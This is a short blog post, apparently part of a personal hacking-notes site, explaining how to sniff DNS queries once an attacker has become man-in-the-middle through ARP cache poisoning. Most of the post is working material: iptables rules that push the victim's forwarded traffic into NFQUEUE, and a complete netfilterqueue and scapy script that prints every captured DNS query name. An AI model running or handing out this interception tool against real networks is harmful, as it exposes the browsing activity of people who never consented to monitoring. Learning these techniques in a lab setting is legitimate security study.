---
title: "DNS request sniffing"
date: 2023-09-09T21:43:00+07:00

---

After we become the [mitm][arp_cache_poisoning] we can sniff the DNS Question Record's QNAME field.  
I am using netfilterqueue here, but it could be done without it as well because we are not modifying any packets on the fly, we are only inspecting.  
To get this code to work you first need to run arp cache poisoning and run this command on attacker machine:  

[arp_cache_poisoning]: https://jellepelle.github.io/doc_the_hacks/arp/arp_cache_poisoning/

```sh
iptables -I FORWARD -j NFQUEUE --queue-num 0
```

Or without arp spoofing on local machine:  
```sh
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I INPUT -j NFQUEUE --queue-num 0
```

Full code:  


```python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    if packet.get_payload:
        try: scapy_packet = scapy.IP(packet.get_payload())
        finally:

            if scapy_packet:
                if scapy_packet.haslayer(scapy.DNSQR):
                    qname = scapy_packet[scapy.DNSQR].qname
                    print(qname)

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```
